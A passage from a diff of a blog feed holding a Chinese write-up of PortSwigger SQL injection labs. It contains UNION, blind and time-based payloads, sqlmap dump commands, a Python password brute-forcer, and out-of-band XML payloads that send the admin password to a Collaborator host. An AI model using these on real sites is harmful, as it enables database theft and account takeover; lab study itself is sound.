+<p><img src="/posts/3b7c6011//image-20250305143611182.png" alt="image-20250305143611182"></p>
+<p>之所以能隐藏信息是因为后端的查询语句是</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;Gifts&#x27;</span> <span class="keyword">AND</span> released <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>因此通过我们的修改注释掉了<code>AND released = 1</code></p>
+<p><strong>思考</strong>：</p>
+<p>首先对后端查询语句要有一定敏感程度，另外如果AND后的语句在前是否就避免了这个漏洞呢？</p>
+<span id="more"></span>
+<h2 id="SQL注入漏洞允许登录绕过">SQL注入漏洞允许登录绕过</h2>
+<p>这个也非常简单，注释掉password就可以登录任意用户了。</p>
+<p><img src="/posts/3b7c6011//image-20250305144942049.png" alt="image-20250305144942049"></p>
+<p><strong>思考</strong>：</p>
+<p>对之前挖的几个平台做了一下尝试，没出意外都失败了。果然这么简单的洞不太好遇见。</p>
+<h2 id="SQL注入UNION攻击，确定查询返回的列数">SQL注入UNION攻击，确定查询返回的列数</h2>
+<p>这个使用<code>?category=Accessones' order by 3--</code>时不报错，使用<code>?category=Accessones' order by 4--</code>时报错，说明返回列有三个。但是不能直接过关，需要使用<code>'?category=Accessones'UNION SELECT NULL,NULL,NULL--</code>过关</p>
+<p><img src="/posts/3b7c6011//image-20250305153505747.png" alt="image-20250305153505747"></p>
+<p>我们可以看到，虽然执行<code>order by 4</code>的时候报错，但是报错代码为500说明还是执行了的。在portswigger中提到：</p>
+<blockquote>
+<p>​            As with the <code>ORDER BY</code> technique, the application might actually return the database error in its HTTP response, but may  return a generic error or simply return no results. When the number of  nulls matches the number of columns, the database returns an additional  row in the result set, containing null values in each column. The effect on the HTTP response depends on the application’s code. If you are  lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a <code>NullPointerException</code>. In the  worst case, the response might look the same as a response caused by an  incorrect number of nulls. This would make this method ineffective.</p>
+</blockquote>
+<p>因此报错语句可以作为是否存在UNION漏洞的参考</p>
+<p>在 Oracle 中，每个 SELECT 查询都必须使用 FROM 关键字，并指定一个有效的表。Oracle 上有一个名为 dual 的内置表，可用于此目的。因此，在 Oracle 上注入的查询必须如下所示：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT NULL FROM DUAL--</span></span><br></pre></td></tr></table></figure>
+<p>MySQL 中，<code>--</code>后必须跟一个空格。</p>
+<p>有关数据库特定语法的更多详情，请参阅 <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>。</p>
+<h2 id="SQL注入UNION攻击，找到包含文本的列">SQL注入UNION攻击，找到包含文本的列</h2>
+<p>让找哪个列支持查找字符串，找出一共多少列以后，挨个试试就可以了</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;+UNION+SELECT+&#x27;</span>abcdef<span class="string">&#x27;,NULL,NULL--</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Accessories<span class="string">&#x27; union select null,&#x27;</span>Y5LIpq<span class="string">&#x27;,null--+</span></span><br><span class="line"><span class="string">或者</span></span><br><span class="line"><span class="string">?category=Accessories%&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="string">&#x27;Y5LIpq&#x27;</span>,<span class="keyword">null</span><span class="comment">--+</span></span><br><span class="line">或者</span><br><span class="line">?category<span class="operator">=</span>Accessories<span class="string">&#x27; and 1=2 union select null,&#x27;</span>Y5LIpq<span class="string">&#x27;,null--+</span></span><br></pre></td></tr></table></figure>
+<h2 id="SQL初入UNION攻击，从其他表中检索数据">SQL初入UNION攻击，从其他表中检索数据</h2>
+<p>让检索出管理员账号密码，然后登陆管理员的账号。这道题的重点是当遇到两个能检索出字符串的列时，如何利用。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT username, password FROM users--</span></span><br></pre></td></tr></table></figure>
+<h2 id="SQL注入UNION攻击，在单列中检索多个值">SQL注入UNION攻击，在单列中检索多个值</h2>
+<p>当只有一个string列可以被检索时，需要将两个列的内容连接到一个列。</p>
+<ol>
+<li class="lvl-3">
+<p>首先通过之前的办法看看有几个可以检索的列</p>
+</li>
+<li class="lvl-3">
+<p>然后检测哪一个列可以检索字符串</p>
+</li>
+<li class="lvl-3">
+<p>最后合并检索用户名和密码</p>
+</li>
+</ol>
+<p>通过检测，可以检索的列有两个，第二个可以检索字符串。将用户名和密码合并到第二列中即可，注入代码：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;union+select+null,username||&#x27;</span><span class="operator">~</span><span class="operator">~</span><span class="operator">~</span><span class="string">&#x27;||password+from+users--</span></span><br></pre></td></tr></table></figure>
+<p>不同的数据库使用不同的语法来执行字符串连接。有关详细信息，请参阅<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>。</p>
+<p>| Oracle     | <code>                   'foo'||'bar'               </code> |<br>
+| ---------- | -------------------------------------------------- |<br>
+| Microsoft  | <code>                   'foo'+'bar'               </code>  |<br>
+| PostgreSQL | <code>                   'foo'||'bar'               </code> |<br>
+| MySQL      | CONCAT(‘foo’,‘bar’)                                |</p>
+<p>然而在实际情况下，我们并不能像题目所给出的那样直接获得表名和列名。因此，现实中，我们需要首先获得数据库的表名和列名，才能对其进行查询。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; union select null,table_name from information_schema.tables--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">列：username,password</span></span><br><span class="line"><span class="string">?category=Gifts&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span><span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">数据:administrator<span class="operator">=</span><span class="operator">=</span><span class="operator">=</span>lcv555mv2prf2m81w40v</span><br><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; union select null,concat(username,&#x27;</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="string">&#x27;,password) from users--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">利用administrator登录</span></span><br></pre></td></tr></table></figure>
+<h2 id="SQL-注入攻击，查询-MySQL-和-Microsoft-的数据库类型和版本">SQL 注入攻击，查询 MySQL 和 Microsoft 的数据库类型和版本</h2>
+<p>获得数据库的版本号，比较简单。各个数据库查询数据库版本的语句如下：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Database type</th>
+<th>Query</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">MySQL</td>
+<td><code>SELECT @@version</code></td>
+</tr>
+<tr>
+<td style="text-align:left">Microsoft</td>
+<td><code>SELECT @@version</code></td>
+</tr>
+<tr>
+<td style="text-align:left">Oracle</td>
+<td><code>SELECT * FROM v$version</code><br><code>SELECT banner FROM v$version</code><br><code>SELECT version FROM v$instance</code></td>
+</tr>
+<tr>
+<td style="text-align:left">PostgreSQL</td>
+<td><code>SELECT version()</code></td>
+</tr>
+</tbody>
+</table>
+<p>查询SQL版本的语句：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;union+select+null,@@version-- +</span></span><br></pre></td></tr></table></figure>
+<p>思考：</p>
+<p>发现了一个问题，在执行SQL注入时，使用<code>--</code>进行注释时需要在其后添加一个空格，即<code>-- +</code>。然而刚开始并没有加但是还是过了，因此需要注意。另外这一题是可以使用<code>#</code>来注释的，但是前面的却不行，原因目前还不明白。</p>
+<h2 id="SQL-注入攻击，列出非-Oracle-数据库的数据库内容">SQL 注入攻击，列出非 Oracle 数据库的数据库内容</h2>
+<p>这一题题目没有给表单和列名，更切合实际情况，实际上跟上面的是一致的。不再过多叙述。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;union select &#x27;</span>a<span class="string">&#x27;,null-- =</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> table_name,<span class="keyword">null</span> <span class="keyword">from</span> information_schema.tables<span class="comment">-- =</span></span><br><span class="line"><span class="string">&#x27;union select column_name,null from information_schema.columns where table_name=&#x27;</span>users_vorbge<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> username_ucmiyr<span class="operator">||</span><span class="string">&#x27;~~~&#x27;</span><span class="operator">||</span>password_unmsjv,<span class="keyword">null</span> <span class="keyword">from</span> users_vorbge<span class="comment">-- =</span></span><br></pre></td></tr></table></figure>
+<h2 id="利用条件响应进行盲目-SQL-注入">利用条件响应进行盲目 SQL 注入</h2>
+<p>在开始这道题之前呢，有必要了解一下，要解决这道题是有三个必要条件的：</p>
+<ol>
+<li class="lvl-3">
+<p><strong>正确和错误的cookie的返回包存在差异</strong></p>
+</li>
+</ol>
+<p>起初我是很困惑我要多么小心翼翼才能发现<code>Welcome back!</code>这一句话的小小差异。然后我就恍然大悟了，我们直接对比response包的大小，如果不一样再找出哪儿不一样就可以了。</p>
+<ol start="2">
+<li class="lvl-3">
+<p><strong>cookie允许盲注</strong></p>
+</li>
+</ol>
+<p>即在cookie后添加<code>'AND '1'='1</code>和添加<code>'AND '1'='2</code>返回的结果是不同的</p>
+<ol start="3">
+<li class="lvl-3">
+<p><strong>我们要查询的表名和列名</strong></p>
+</li>
+</ol>
+<p>虽然题目直接给了我们表名和列名，当我们都知道，实际情况中并不会有公司摆着洞给我们挖。因此有没有办法通过盲注获得我们需要的表名和列名呢？那当然是有的。</p>
+<p>我们要知道，盲注语句是否执行成功我们是可以知道的。那么，是否存在一个表单或者列名，我们也是可以了解的。因此，我们依然可以通过盲注的方式获得表名和列名。</p>
+<p>所以是可以使用Python写脚本爆破的，当然也可以用sqlmap工具，非常简便。</p>
+<p><font class="notice">我打算再写一篇sqlmap的用法总结，先这里插个眼</font></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.首先进行sql漏洞扫描</span><br><span class="line">sqlmap -u url --cookie <span class="string">&quot;TrackingId=xxx&quot;</span></span><br><span class="line">2.然后获得当前使用的数据库名称</span><br><span class="line">sqlmap -u url --current-db</span><br><span class="line">3.获得所有表</span><br><span class="line">sqlmap -u url -D <span class="string">&quot;数据库名&quot;</span> --tables</span><br><span class="line">4.获得<span class="built_in">users</span>表字段</span><br><span class="line">sqlmap -u url -D <span class="string">&quot;数据库名&quot;</span> -T <span class="string">&quot;users&quot;</span> --dump</span><br><span class="line">5.获得<span class="built_in">users</span>表中的用户名</span><br><span class="line">sqlmap -u url -D <span class="string">&quot;数据库名&quot;</span> -T <span class="string">&quot;users&quot;</span> -C <span class="string">&quot;username&quot;</span> --dump</span><br></pre></td></tr></table></figure>
+<p>在获得某用户密码的时候，本题只需要我们获得<code>administrator</code>的密码就可以了，考虑到密码又多又长，逐个爆破会消耗大量的时间，因此我编写了Python脚本单独对<code>administrator</code>用户进行爆破，脚本已经很自动化了，只需要把url和TrackingId换成子自己的就可以了。脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求的URL</span></span><br><span class="line">url = <span class="string">&quot;https://0a00000a04a6557481de208a005400a1.web-security-academy.net/filter?category=Pets&quot;</span></span><br><span class="line">username = <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">tablename = <span class="string">&#x27;users&#x27;</span></span><br><span class="line">method = <span class="string">&#x27;get&#x27;</span></span><br><span class="line">sleep_time = <span class="number">0</span></span><br><span class="line">TrackingId = <span class="string">&#x27;brVO8ubeFsIHT9hw&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#cookie获取密码长度get_password_length_by_user</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password_length_by_user</span>(<span class="params">url,username,tablename,intject_id</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        cookies = &#123;</span><br><span class="line">            <span class="string">&#x27;TrackingId&#x27;</span>: <span class="string">f&quot;<span class="subst">&#123;intject_id&#125;</span>&#x27; and (select &#x27;a&#x27; from users where username=&#x27;<span class="subst">&#123;username&#125;</span>&#x27; AND LENGTH(password)&gt;<span class="subst">&#123;i&#125;</span>)=&#x27;a&#x27; --+&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.request(url=url,method=method,cookies=cookies)</span><br><span class="line">        sleep(sleep_time)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Welcome back!&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            password_length=i</span><br><span class="line">            <span class="keyword">return</span> password_length</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#爆破某一用户名密码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password_by_user</span>(<span class="params">url,username,tablename,inject_id</span>):</span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    password_length=get_password_length_by_user(url,username,tablename,inject_id)</span><br><span class="line">    <span class="keyword">for</span> password_index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, password_length+<span class="number">1</span>):</span><br><span class="line">        ascii_low = <span class="number">32</span></span><br><span class="line">        ascii_high = <span class="number">128</span></span><br><span class="line">        ascii_mid=(ascii_low+ascii_high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> ascii_low &lt; ascii_high:</span><br><span class="line">            cookies = &#123;</span><br><span class="line">                <span class="string">&#x27;TrackingId&#x27;</span>: <span class="string">f&quot;<span class="subst">&#123;inject_id&#125;</span>&#x27; and ascii(substr((select password from <span class="subst">&#123;tablename&#125;</span> where username=&#x27;<span class="subst">&#123;username&#125;</span>&#x27;),<span class="subst">&#123;password_index&#125;</span>,1)) &gt; <span class="subst">&#123;ascii_mid&#125;</span>--+;&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            response = requests.request(url=url,method=method,cookies=cookies)</span><br><span class="line">            sleep(sleep_time)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Welcome back!&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                ascii_low=ascii_mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ascii_high = ascii_mid</span><br><span class="line">            ascii_mid=(ascii_low+ascii_high)//<span class="number">2</span></span><br><span class="line">        result+=<span class="built_in">chr</span>(ascii_mid)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">password=get_password_by_user( url,username,tablename,TrackingId)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure>
+<p><font class="notice">其实，本题在爆破数据表时，也可以使用Python单独对表名中含有<code>user</code>的表进行爆破，但考虑实际情况，把所有的表名爆破出，容易获得更多的信息</font></p>
+<h2 id="带有条件错误的盲-SQL-注入">带有条件错误的盲 SQL 注入</h2>
+<p>Substring用法：你可以从指定偏移量开始，提取具有指定长度的字符串部分。需要注意的是，偏移量索引是从1开始计数的。以下每个表达式都将返回字符串 <code>ba</code>。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">数据库</th>
+<th style="text-align:left">语法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Oracle</td>
+<td style="text-align:left"><code>SUBSTR('foobar', 4, 2)</code></td>
+</tr>
+<tr>
+<td style="text-align:left">Microsoft</td>
+<td style="text-align:left"><code>SUBSTRING('foobar', 4, 2)</code></td>
+</tr>
+<tr>
+<td style="text-align:left">PostgreSQL</td>
+<td style="text-align:left"><code>SUBSTRING('foobar', 4, 2)</code></td>
+</tr>
+<tr>
+<td style="text-align:left">MySQL</td>
+<td style="text-align:left"><code>SUBSTRING('foobar', 4, 2)</code></td>
+</tr>
+</tbody>
+</table>
+<p>跟上一题是非常类似的。讲一下原理</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、添加单引号收到错误</span><br><span class="line">TrackingId<span class="operator">=</span>xyz<span class="string">&#x27;</span></span><br><span class="line"><span class="string">2、添加两个单引号错误消失</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;&#x27;</span></span><br><span class="line"><span class="string">3、确认是查询错误而不是其他类型错误。下列语句表明目标为Oracle 数据库</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;（错误）</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">FROM</span> dual)<span class="operator">||</span><span class="string">&#x27;（正确）</span></span><br><span class="line"><span class="string">4、验证users表存在</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> ROWNUM <span class="operator">=</span> <span class="number">1</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">5、验证用户administrator存在</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">1</span><span class="operator">=</span><span class="number">1</span>) <span class="keyword">THEN</span> TO_CHAR(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>) <span class="keyword">ELSE</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">END</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">6、爆破密码长度</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> LENGTH(password)<span class="operator">&gt;</span>§a§ <span class="keyword">THEN</span> to_char(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>) <span class="keyword">ELSE</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">END</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">7、爆破密码</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> SUBSTR(password,§b§,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;§a§&#x27;</span> <span class="keyword">THEN</span> TO_CHAR(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>) <span class="keyword">ELSE</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">END</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>结果如下：</p>
+<p><img src="/posts/3b7c6011//image-20250316173050195.png" alt="image-20250316173050195"></p>
+<h2 id="基于可见错误的-SQL-注入-bool型SQL注入">基于可见错误的 SQL 注入(bool型SQL注入)</h2>
+<p>错误会返回到客户端</p>
+<p><img src="/posts/3b7c6011//image-20250316181656140.png" alt="image-20250316181656140"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、天加一个引号，可以在web页面看到报错，并看到自己的cookie</span><br><span class="line">TrackingId<span class="operator">=</span>xxx<span class="string">&#x27;</span></span><br><span class="line"><span class="string">2、添加注释符不再报错</span></span><br><span class="line"><span class="string">TrackingId=xxx&#x27;</span><span class="comment">--</span></span><br><span class="line"><span class="number">3</span>、添加错误的语句观察返回内容</span><br><span class="line">TrackingId<span class="operator">=</span>xxx<span class="string">&#x27; AND CAST((SELECT 1) AS int)--</span></span><br><span class="line"><span class="string">4、使用正确语句错误消失</span></span><br><span class="line"><span class="string">TrackingId=xxx&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">CAST</span>((<span class="keyword">SELECT</span> <span class="number">1</span>) <span class="keyword">AS</span> <span class="type">int</span>)<span class="comment">--</span></span><br><span class="line"><span class="number">5</span>、泄露用户</span><br><span class="line">TrackingId<span class="operator">=</span>xxxx<span class="string">&#x27; AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--</span></span><br><span class="line"><span class="string">6、泄露密码</span></span><br><span class="line"><span class="string">TrackingId=&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">CAST</span>((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>) <span class="keyword">AS</span> <span class="type">int</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p>我试了下面这个注入语句，但是没有得到想要的结果。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span><span class="string">&#x27; AND 1=CAST((SELECT password FROM users where username=&#x27;</span>administrator<span class="string">&#x27;) AS int)--</span></span><br></pre></td></tr></table></figure>
+<p><img src="/posts/3b7c6011//image-20250316184013533.png" alt="image-20250316184013533"></p>
+<h2 id="带有时间延迟和信息检索的盲-SQL-注入">带有时间延迟和信息检索的盲 SQL 注入</h2>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>延迟<span class="number">10</span>秒</span><br><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</span></span><br><span class="line"><span class="string">2.不延时</span></span><br><span class="line"><span class="string">TrackingId=x&#x27;</span><span class="operator">%</span><span class="number">3</span>BSELECT<span class="operator">+</span><span class="keyword">CASE</span><span class="operator">+</span><span class="keyword">WHEN</span><span class="operator">+</span>(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>)<span class="operator">+</span><span class="keyword">THEN</span><span class="operator">+</span>pg_sleep(<span class="number">10</span>)<span class="operator">+</span><span class="keyword">ELSE</span><span class="operator">+</span>pg_sleep(<span class="number">0</span>)<span class="operator">+</span><span class="keyword">END</span><span class="comment">--</span></span><br><span class="line"><span class="number">3.</span>延时，说明有administrator用户</span><br><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;%3BSELECT+CASE+WHEN+(username=&#x27;</span>administrator<span class="string">&#x27;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</span></span><br><span class="line"><span class="string">4.延时，说明密码长度为20</span></span><br><span class="line"><span class="string">TrackingId=x&#x27;</span><span class="operator">%</span><span class="number">3</span>BSELECT<span class="operator">+</span><span class="keyword">CASE</span><span class="operator">+</span><span class="keyword">WHEN</span><span class="operator">+</span>(username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span><span class="operator">+</span><span class="keyword">AND</span><span class="operator">+</span>LENGTH(password)<span class="operator">=</span><span class="number">20</span>)<span class="operator">+</span><span class="keyword">THEN</span><span class="operator">+</span>pg_sleep(<span class="number">10</span>)<span class="operator">+</span><span class="keyword">ELSE</span><span class="operator">+</span>pg_sleep(<span class="number">0</span>)<span class="operator">+</span><span class="keyword">END</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>users<span class="comment">--</span></span><br><span class="line"><span class="number">5.</span>bp爆破</span><br><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;%3BSELECT+CASE+WHEN+(username=&#x27;</span>administrator<span class="string">&#x27;+AND+SUBSTRING(password,§b§,1)=&#x27;</span>§a§<span class="string">&#x27;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</span></span><br></pre></td></tr></table></figure>
+<h2 id="带外交互的盲-SQL-注入">带外交互的盲 SQL 注入</h2>
+<p><img src="/posts/3b7c6011//image-20250320124609391.png" alt="image-20250320124609391"></p>
+<p><a href="http://k8tddk5vl36mmu8y9zj46y1zdqjk7ev3.oastify.com">k8tddk5vl36mmu8y9zj46y1zdqjk7ev3.oastify.com</a></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Cookie: TrackingId<span class="operator">=</span>Mf3GZbtHdrUPYCyR<span class="string">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span><span class="operator">%</span><span class="number">3</span>fxml<span class="operator">+</span>version<span class="operator">%</span><span class="number">3</span>d&quot;1.0&quot;<span class="operator">+</span>encoding<span class="operator">%</span><span class="number">3</span>d&quot;UTF-8&quot;<span class="operator">%</span><span class="number">3</span>f<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE<span class="operator">+</span>root<span class="operator">+</span>[<span class="operator">+</span><span class="operator">&lt;</span><span class="operator">!</span>ENTITY<span class="operator">+</span><span class="operator">%</span><span class="number">25</span><span class="operator">+</span>remote<span class="operator">+</span><span class="keyword">SYSTEM</span><span class="operator">+</span>&quot;http%3a//k8tddk5vl36mmu8y9zj46y1zdqjk7ev3.oastify.com/&quot;<span class="operator">&gt;</span><span class="operator">+</span><span class="operator">%</span><span class="number">25</span>remote<span class="operator">%</span><span class="number">3</span>b]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;)+FROM+dual--; session=7HQmzle2kv8m9yAyiZADwZ8B64e6hGQp</span></span><br></pre></td></tr></table></figure>
+<p><img src="/posts/3b7c6011//image-20250320124746996.png" alt="image-20250320124746996"></p>
+<h2 id="SQL盲注与带外数据渗出">SQL盲注与带外数据渗出</h2>
+<p>跟上边类似的</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span><span class="operator">%</span><span class="number">3</span>fxml<span class="operator">+</span>version<span class="operator">%</span><span class="number">3</span>d&quot;1.0&quot;<span class="operator">+</span>encoding<span class="operator">%</span><span class="number">3</span>d&quot;UTF-8&quot;<span class="operator">%</span><span class="number">3</span>f<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE<span class="operator">+</span>root<span class="operator">+</span>[<span class="operator">+</span><span class="operator">&lt;</span><span class="operator">!</span>ENTITY<span class="operator">+</span><span class="operator">%</span><span class="number">25</span><span class="operator">+</span>remote<span class="operator">+</span><span class="keyword">SYSTEM</span><span class="operator">+</span>&quot;http%3a//&#x27;||(SELECT+password+FROM+users+WHERE+username%3d&#x27;administrator&#x27;)||&#x27;.BURP-COLLABORATOR-SUBDOMAIN/&quot;<span class="operator">&gt;</span><span class="operator">+</span><span class="operator">%</span><span class="number">25</span>remote<span class="operator">%</span><span class="number">3</span>b]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;)+FROM+dual--</span></span><br></pre></td></tr></table></figure>
+<p><img src="/posts/3b7c6011//image-20250320142450030.png" alt="image-20250320142450030"></p>
+<h2 id="通过-XML-编码绕过过滤器的-SQL-注入XML绕过注入">通过 XML 编码绕过过滤器的 SQL 注入XML绕过注入</h2>
+<p><img src="/posts/3b7c6011//image-20250320153828228.png" alt="image-20250320153828228"></p>
+<p><img src="/posts/3b7c6011//image-20250320153954704.png" alt="image-20250320153954704"></p>
+<p>本文参考：</p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>渗透测试</category>
+        <category>SQL注入</category>
       </categories>
       <tags>
         <tag>PortSwigger靶场</tag>
@@ -11344,43 +12746,5 @@ rows：返回具体行数。</strong></p>
       <tags>
         <tag>MYSQL</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>我的第一篇博客——开启我的新篇章</title>
-    <url>/posts/8d60c6a5/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Wrong password, please try again.Or you can contact the author to view the blog" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
